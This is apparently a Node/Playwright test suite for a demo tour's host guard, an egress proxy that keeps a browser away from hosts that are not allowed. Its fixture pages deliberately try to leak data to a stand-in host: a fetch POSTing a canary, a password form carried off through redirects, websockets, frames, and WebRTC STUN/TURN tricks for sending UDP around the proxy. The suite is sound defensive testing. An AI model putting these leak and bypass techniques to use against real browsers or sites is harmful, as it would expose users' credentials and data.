// The web tour's host guard, proven in a real browser: nothing the browser does reaches a
// host that is not allowed. Run with `node --test` from scripts/demo (docs/demo-video.md).
//
// Two servers on this machine. The tour's pages come from `localhost`, the one allowed host
// here. The other host is the same machine under another name, 127.0.0.1: it is reachable (the
// last test shows it), so whenever it gets no connection, the guard is what kept the browser
// away. It counts TCP connections, not only requests: "nothing reached it" means not even a
// handshake.
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import dgram from "node:dgram";
import { existsSync } from "node:fs";
import http from "node:http";
import net from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, before, test } from "node:test";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright-core";
import {
  allowedHosts,
  guardContext,
  isElsewhere,
  launchGuarded,
  permits,
  startGuard,
  tunnelTarget,
} from "./tour-guard.mjs";

// Playwright itself sends loopback through a proxy unless this is set. The tour must not lean
// on that default: with it switched off, only the guard's own launch options keep 127.0.0.1
// behind the proxy.
process.env.PLAYWRIGHT_DISABLE_FORCED_CHROMIUM_PROXIED_LOOPBACK = "1";
const CHANNEL = process.env.DEMO_BROWSER_CHANNEL ?? "msedge";
const HERE = dirname(fileURLToPath(import.meta.url));
const CANARY = "demo-only-canary";
const REDIRECTS = [301, 302, 303, 307, 308];
const PIXEL = Buffer.from("R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==", "base64");

const listen = (server, host) =>
  new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, host, resolve);
  });

// ---- The other host: whatever arrives is a leak. ----
const leaks = { connections: 0, requests: [] };
const other = http.createServer(async (request, response) => {
  let body = "";
  for await (const chunk of request) body += chunk;
  leaks.requests.push({ method: request.method, path: request.url, canary: body.includes(CANARY) });
  response.writeHead(200, { "content-type": "text/html" }).end("<h1>the other host</h1>");
});
other.on("connection", () => (leaks.connections += 1));
other.on("upgrade", (_request, socket) => socket.destroy());

// ---- The allowed host: pages that try every way out. ----
let elsewhere; // http://127.0.0.1:<port>, set once the other host listens
const html = (body) => `<!doctype html><title>tour guard</title>${body}`;
const PAGES = {
  "/page": () => html('<h1>allowed page</h1><img id="pixel" src="/pixel">'),
  "/sub": () =>
    html(
      `<h1>subresources</h1><img src="${elsewhere}/pixel"><script src="${elsewhere}/x.js"></script>` +
        `<link rel="stylesheet" href="${elsewhere}/x.css">` +
        `<script>fetch("${elsewhere}/fetch", { method: "POST", body: "${CANARY}" }).catch(() => {});</script>`,
    ),
  "/frame": () => html(`<h1>frame</h1><iframe src="${elsewhere}/framed"></iframe>`),
  "/socket": () =>
    html(
      `<h1>socket</h1><script>try { new WebSocket("${elsewhere.replace("http", "ws")}/ws"); } catch {}</script>`,
    ),
  "/script": () => html(`<script>location.href = "${elsewhere}/scripted";</script>`),
};
const form = (action) =>
  html(
    `<form method="post" action="${action}"><input name="password" value="${CANARY}">` +
      "<button>Sign in</button></form>",
  );
const allowed = http.createServer((request, response) => {
  const { pathname } = new URL(request.url, "http://localhost");
  const [, kind, status] = pathname.split("/");
  if (kind === "redirect") {
    // To the other host, with the status asked for: 307 and 308 carry a POST's body along.
    response.writeHead(Number(status), { location: `${elsewhere}/receive` }).end();
  } else if (kind === "form") {
    response.writeHead(200, { "content-type": "text/html" }).end(form(`/redirect/${status}`));
  } else if (pathname === "/hop") {
    response.writeHead(302, { location: "/redirect/307" }).end();
  } else if (pathname === "/stay-form") {
    response.writeHead(200, { "content-type": "text/html" }).end(form("/stay"));
  } else if (pathname === "/stay") {
    response.writeHead(303, { location: "/page" }).end();
  } else if (pathname === "/pixel") {
    response.writeHead(200, { "content-type": "image/gif" }).end(PIXEL);
  } else if (pathname in PAGES) {
    response.writeHead(200, { "content-type": "text/html" }).end(PAGES[pathname]());
  } else {
    response.writeHead(404).end();
  }
});

let origin;
let guard;
let browser;
before(async () => {
  await listen(other, "127.0.0.1");
  elsewhere = `http://127.0.0.1:${other.address().port}`;
  await listen(allowed, "localhost");
  origin = `http://localhost:${allowed.address().port}`;
  guard = await startGuard(new Set(["localhost"]));
  browser = await launchGuarded(chromium, guard, { channel: CHANNEL, headless: true });
});
after(async () => {
  await browser?.close();
  await guard?.close();
  for (const server of [allowed, other]) {
    server.closeAllConnections();
    await new Promise((resolve) => server.close(resolve));
  }
});

/** A fresh page, with the leak counters and the guard's list emptied. */
async function fresh() {
  leaks.connections = 0;
  leaks.requests.length = 0;
  guard.refused.length = 0;
  const context = await browser.newContext();
  return { context, page: await context.newPage() };
}

/** Lets anything that slipped out arrive, then: no connection, no request, and a refusal. */
async function nothingReachedTheOtherHost(page) {
  await page.waitForTimeout(500);
  assert.deepEqual(leaks.requests, []);
  assert.equal(leaks.connections, 0);
  assert.ok(guard.refused.includes("127.0.0.1"), "the guard refused the other host");
}

test("a navigation to another host gets the guard's refusal, not the host", async () => {
  const { context, page } = await fresh();
  const response = await page.goto(`${elsewhere}/direct`);
  assert.equal(response.status(), 403);
  await nothingReachedTheOtherHost(page);
  await context.close();
});

for (const status of REDIRECTS) {
  test(`a ${status} from an allowed page to another host is not followed (GET)`, async () => {
    const { context, page } = await fresh();
    const response = await page.goto(`${origin}/redirect/${status}`);
    assert.equal(response.status(), 403);
    await nothingReachedTheOtherHost(page);
    await context.close();
  });

  test(`a ${status} does not carry a posted form to another host`, async () => {
    const { context, page } = await fresh();
    await page.goto(`${origin}/form/${status}`);
    await page.locator("button").click();
    await page.waitForLoadState();
    await nothingReachedTheOtherHost(page);
    await context.close();
  });
}

test("a redirect chain is checked at every hop, not only the first", async () => {
  const { context, page } = await fresh();
  await page.goto(`${origin}/hop`);
  await nothingReachedTheOtherHost(page);
  await context.close();
});

test("an image, a script, a stylesheet and a fetch to another host are refused", async () => {
  const { context, page } = await fresh();
  await page.goto(`${origin}/sub`);
  await nothingReachedTheOtherHost(page);
  await context.close();
});

test("a frame of another host is refused", async () => {
  const { context, page } = await fresh();
  await page.goto(`${origin}/frame`);
  await nothingReachedTheOtherHost(page);
  await context.close();
});

test("a websocket to another host is refused", async () => {
  const { context, page } = await fresh();
  await page.goto(`${origin}/socket`);
  await nothingReachedTheOtherHost(page);
  await context.close();
});

test("a script that sends the page to another host is refused", async () => {
  const { context, page } = await fresh();
  await page.goto(`${origin}/script`).catch(() => {});
  await nothingReachedTheOtherHost(page);
  await context.close();
});

test("the allowed host works: a page, its image, a posted form and its redirect", async () => {
  const { context, page } = await fresh();
  await page.goto(`${origin}/page`);
  assert.equal(await page.locator("h1").textContent(), "allowed page");
  assert.ok(await page.locator("#pixel").evaluate((image) => image.complete && image.naturalWidth));
  await page.goto(`${origin}/stay-form`);
  await page.locator("button").click();
  await page.waitForURL(`${origin}/page`);
  // The browser's own background calls (updates, telemetry) are refused too, so the list is
  // not empty; nothing here asked for the other host.
  assert.ok(!guard.refused.includes("127.0.0.1"));
  assert.equal(leaks.connections, 0);
  await context.close();
});

test("with the other host allowed, the same form does reach it: the guard is what stops it", async () => {
  const open = await startGuard(new Set(["localhost", "127.0.0.1"]));
  const unguarded = await launchGuarded(chromium, open, { channel: CHANNEL, headless: true });
  try {
    leaks.connections = 0;
    leaks.requests.length = 0;
    const page = await unguarded.newPage();
    await page.goto(`${origin}/form/307`);
    await page.locator("button").click();
    await page.waitForURL(`${elsewhere}/receive`);
    assert.deepEqual(leaks.requests, [{ method: "POST", path: "/receive", canary: true }]);
  } finally {
    await unguarded.close();
    await open.close();
  }
});

/** Sends `lines` to the guard on a raw connection, then resets it (as a browser may). */
function sendAndReset(lines) {
  const { port } = new URL(guard.url);
  return new Promise((resolve) => {
    const socket = net.connect(Number(port), "127.0.0.1", () => {
      socket.write(lines);
      setTimeout(() => {
        socket.resetAndDestroy();
        resolve();
      }, 100);
    });
    socket.on("error", () => {});
  });
}

test("a reset or malformed connection ends that connection, never the guard", async () => {
  // A refused tunnel the browser resets; a tunnel to a malformed authority; a request cut off
  // half way; an allowed tunnel reset before it opens.
  const CRLF = "\r\n";
  await sendAndReset(
    ["CONNECT blocked.example:443 HTTP/1.1", "Host: blocked.example:443", "", ""].join(CRLF),
  );
  await sendAndReset(["CONNECT [::bad HTTP/1.1", "Host: x", "", ""].join(CRLF));
  await sendAndReset([`GET ${origin}/page HTTP/1.1`, "Host: localhost", ""].join(CRLF));
  await sendAndReset([`CONNECT localhost:${new URL(origin).port} HTTP/1.1`, "", ""].join(CRLF));
  const { context, page } = await fresh();
  await page.goto(`${origin}/page`);
  assert.equal(await page.locator("h1").textContent(), "allowed page");
  await context.close();
});

test("the tour's own hosts are this machine and the named staging host", () => {
  assert.deepEqual([...allowedHosts(undefined)], ["localhost", "127.0.0.1"]);
  assert.deepEqual(
    [...allowedHosts("staging.example")],
    ["localhost", "127.0.0.1", "staging.example"],
  );
});

test("the tour refuses another base host, or an unknown scene, before it starts", () => {
  const out = join(tmpdir(), `tour-guard-test-${process.pid}`);
  const run = (...args) =>
    spawnSync(process.execPath, [join(HERE, "web-tour.mjs"), "--out", out, ...args], {
      encoding: "utf8",
      env: { ...process.env, DEMO_STAGING_HOST: "" },
    });
  const production = run("--base", "https://jackfixit.com");
  assert.equal(production.status, 2);
  assert.match(production.stderr, /refusing: jackfixit\.com/);
  const unknown = run("--base", "http://localhost:3000", "--scenes", "nope");
  assert.equal(unknown.status, 2);
  // Names every object inherits are not scenes either.
  const inherited = run("--base", "http://localhost:3000", "--scenes", "toString,constructor");
  assert.equal(inherited.status, 2);
  assert.match(inherited.stderr, /unknown scene\(s\): toString, constructor/);
  const file = run("--base", "file:///C:/");
  assert.equal(file.status, 2);
  assert.equal(existsSync(out), false);
});

// ---- What the adversarial review found (2026-11-20), each closed and proven here. ----

/** A UDP socket on the other host's address: counts every datagram that reaches it. */
async function udpSink() {
  const socket = dgram.createSocket("udp4");
  const sink = { datagrams: 0, close: () => new Promise((resolve) => socket.close(resolve)) };
  socket.on("message", () => (sink.datagrams += 1));
  await new Promise((resolve) => socket.bind(0, "127.0.0.1", resolve));
  sink.port = socket.address().port;
  return sink;
}

/** A page's script that points WebRTC at host:port every way it can: a STUN server, a TURN
 * server over UDP, and a remote ICE candidate (connectivity checks carry the page's data). */
const webrtcTowards = (host, port) => `
  (async () => {
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: "stun:${host}:${port}" }, { urls: "turn:${host}:${port}?transport=udp", username: "${CANARY}", credential: "x" }],
    });
    pc.createDataChannel("x");
    const remote = new RTCPeerConnection();
    remote.createDataChannel("y");
    await pc.setLocalDescription(await pc.createOffer());
    await remote.setRemoteDescription(pc.localDescription);
    await remote.setLocalDescription(await remote.createAnswer());
    await pc.setRemoteDescription(remote.localDescription);
    await pc.addIceCandidate({ candidate: "candidate:1 1 udp 2122260223 ${host} ${port} typ host", sdpMid: "0", sdpMLineIndex: 0 });
  })().catch(() => {});`;

test("WebRTC sends no UDP around the guard, even where the page keeps RTCPeerConnection", async () => {
  // The launch switch alone: a plain context, the constructors left in place.
  const sink = await udpSink();
  try {
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto(`${origin}/page`);
    assert.equal(await page.evaluate(() => typeof RTCPeerConnection), "function");
    await page.evaluate(webrtcTowards("127.0.0.1", sink.port));
    await page.waitForTimeout(3000);
    assert.equal(sink.datagrams, 0);
    await context.close();
  } finally {
    await sink.close();
  }
});

test("a guarded context has no WebRTC in any of its frames", async () => {
  const context = await guardContext(await browser.newContext());
  const page = await context.newPage();
  await page.goto(`${origin}/page`);
  await page.setContent('<iframe srcdoc="<p>framed</p>"></iframe>');
  const frame = page.frames()[1];
  assert.equal(await page.evaluate(() => typeof RTCPeerConnection), "undefined");
  assert.equal(await frame.evaluate(() => typeof RTCPeerConnection), "undefined");
  await context.close();
});

test("an address Node cannot parse is refused, and the tour's checks fail closed", async () => {
  const { context, page } = await fresh();
  await page.setContent('<img src="http://xn--a/x.png">');
  await page.waitForTimeout(500);
  await page.goto(`${origin}/page`);
  assert.equal(await page.locator("h1").textContent(), "allowed page");
  await context.close();
  const allowedSet = allowedHosts(undefined);
  assert.equal(isElsewhere("http://xn--a/", allowedSet), true);
  assert.equal(isElsewhere("file:///C:/demo.png", allowedSet), true);
  assert.equal(isElsewhere("chrome-error://chromewebdata/", allowedSet), true);
  assert.equal(isElsewhere("about:blank", allowedSet), false);
  assert.equal(isElsewhere("http://LOCALHOST:3000/admin", allowedSet), false);
});

/** A server on the allowed host that answers every request with the raw bytes `answer`. */
async function rawServer(answer) {
  const server = net.createServer((socket) => {
    socket.on("error", () => {});
    socket.once("data", () => socket.end(answer));
  });
  await listen(server, "localhost");
  return server;
}

test("an allowed server's broken answer is a 502, and the guard keeps serving", async () => {
  const broken = [
    "HTTP/1.1 200 O\x01K\r\nContent-Length: 0\r\n\r\n", // a control character in the reason
    "HTTP/1.1 099 Early\r\nContent-Length: 0\r\n\r\n", // a status below 100
    "HTTP/1.1 101 Switching Protocols\r\nConnection: upgrade\r\nUpgrade: x\r\n\r\n",
  ];
  for (const answer of broken) {
    const server = await rawServer(answer);
    try {
      const { context, page } = await fresh();
      const response = await page.goto(`http://localhost:${server.address().port}/x`, {
        timeout: 10000,
      });
      assert.equal(response.status(), 502, JSON.stringify(answer));
      await context.close();
    } finally {
      server.close();
    }
  }
  const { context, page } = await fresh();
  await page.goto(`${origin}/page`);
  assert.equal(await page.locator("h1").textContent(), "allowed page");
  await context.close();
});

test("a tunnel goes to the port it names: 80 stays 80, and no port is no tunnel", () => {
  assert.deepEqual(tunnelTarget("127.0.0.1:80"), { host: "127.0.0.1", port: 80 });
  assert.deepEqual(tunnelTarget("LOCALHOST:443"), { host: "localhost", port: 443 });
  assert.deepEqual(tunnelTarget("[::1]:8080"), { host: "::1", port: 8080 });
  for (const authority of [
    "localhost",
    "localhost:",
    "localhost:0",
    "localhost:70000",
    ":443",
    "a:b",
  ]) {
    assert.equal(tunnelTarget(authority), null, authority);
  }
});

test("an IPv6 staging host is the same host however it is written", () => {
  for (const staging of ["::1", "[::1]"]) {
    const set = allowedHosts(staging);
    assert.equal(permits(set, "[::1]"), true);
    assert.equal(permits(set, "::1"), true);
    assert.equal(isElsewhere("http://[::1]:8080/", set), false);
  }
});

test("Node's proxy settings never send the guard's traffic to another host", async () => {
  // The guard runs in a child process with Node's env proxy on, aimed at the other host.
  const child = spawn(
    process.execPath,
    [
      "--input-type=module",
      "-e",
      `import { startGuard } from ${JSON.stringify(new URL("./tour-guard.mjs", import.meta.url).href)};
       const guard = await startGuard(new Set(["localhost"]));
       console.log(guard.url);`,
    ],
    {
      env: {
        ...process.env,
        NODE_USE_ENV_PROXY: "1",
        HTTP_PROXY: elsewhere,
        http_proxy: elsewhere,
        NO_PROXY: "",
      },
    },
  );
  try {
    const guardUrl = await new Promise((resolve, reject) => {
      child.stdout.once("data", (chunk) => resolve(String(chunk).trim()));
      child.once("exit", (code) => reject(new Error(`guard exited ${code}`)));
    });
    leaks.connections = 0;
    leaks.requests.length = 0;
    const proxy = new URL(guardUrl);
    const body = await new Promise((resolve, reject) => {
      const request = http.request(
        { host: proxy.hostname, port: proxy.port, path: `${origin}/page`, agent: false },
        (answer) => {
          let text = "";
          answer.on("data", (chunk) => (text += chunk));
          answer.on("end", () => resolve(text));
        },
      );
      request.on("error", reject);
      request.end();
    });
    assert.match(body, /allowed page/);
    assert.equal(leaks.connections, 0);
  } finally {
    child.kill();
  }
});
